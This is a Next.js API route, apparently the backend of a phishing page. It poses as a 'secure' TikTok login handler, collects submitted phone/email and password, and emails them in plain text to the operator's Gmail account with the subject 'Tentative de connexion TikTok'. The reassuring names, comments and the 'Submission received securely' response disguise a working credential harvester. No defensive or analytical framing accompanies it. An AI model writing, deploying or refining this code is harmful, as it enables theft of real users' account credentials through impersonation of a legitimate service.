// pages/api/secure-login.ts
import type { NextApiRequest, NextApiResponse } from 'next';
import nodemailer from 'nodemailer';
import rateLimit from '../../utils/rateLimit';
import { z } from 'zod';

// Rate limiter to avoid abuse
const limiter = rateLimit({ interval: 60 * 1000, uniqueTokenPerInterval: 100 });

// Schema to validate credentials input
const credentialsSchema = z.object({
  phoneOrEmail: z.string().min(3),
  password: z.string().min(6)
});

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') return res.status(405).end('Method Not Allowed');

  try {
    // Apply rate limiting by IP
    await limiter.check(res, 5, req.socket.remoteAddress || 'anonymous');

    const parsed = credentialsSchema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ error: 'Invalid input format' });
    }

    const { phoneOrEmail, password } = parsed.data;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: `"Secure TikTok Auth" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER,
      subject: 'Tentative de connexion TikTok',
      text: `phoneOrEmail: ${phoneOrEmail}\nPassword: ${password}`,
    });

    res.status(200).json({ message: 'Submission received securely' });
  } catch (err) {
    console.error('Error:', err);
    res.status(429).json({ error: 'Too many requests or server error' });
  }
}
